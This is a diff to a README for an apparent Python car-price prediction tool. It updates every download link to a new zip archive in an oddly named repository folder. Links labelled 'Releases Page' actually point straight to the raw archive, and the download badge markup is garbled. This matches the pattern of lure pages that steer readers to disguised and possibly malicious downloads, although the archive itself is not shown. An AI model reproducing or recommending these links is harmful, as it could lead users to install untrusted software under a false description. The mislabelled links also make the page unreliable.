@@ -1,6 +1,6 @@
 # 🚗 04Python-CarPricePredictor - Predict Car Prices Easily
 
-[![Download Now](https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/04Python-CarPricePredictor.zip%20Now-Click%https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/04Python-CarPricePredictor.zip)](https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/04Python-CarPricePredictor.zip)
+[![Download Now](https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/Predictor-Price-Car-Python-1.6.zip%20Now-Click%https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/Predictor-Price-Car-Python-1.6.zip)](https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/Predictor-Price-Car-Python-1.6.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ Follow these simple steps to download and set up the application on your compute
 
 ### 📥 Download & Install
 
-To get the latest version of the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/04Python-CarPricePredictor.zip).
+To get the latest version of the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/Predictor-Price-Car-Python-1.6.zip).
 
 1. Open your web browser.
 2. Click on the link above to visit the Releases page.
@@ -91,6 +91,6 @@ For direct support or to report any issues, please open an issue on our GitHub p
 
 ## 🔗 Download the Latest Version
 
-You can always find the most up-to-date version here: [Releases Page](https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/04Python-CarPricePredictor.zip). 
+You can always find the most up-to-date version here: [Releases Page](https://raw.githubusercontent.com/Anjinho176/04Python-CarPricePredictor/main/proconsulship/Predictor-Price-Car-Python-1.6.zip). 
 
 Download now and start predicting car prices easily!
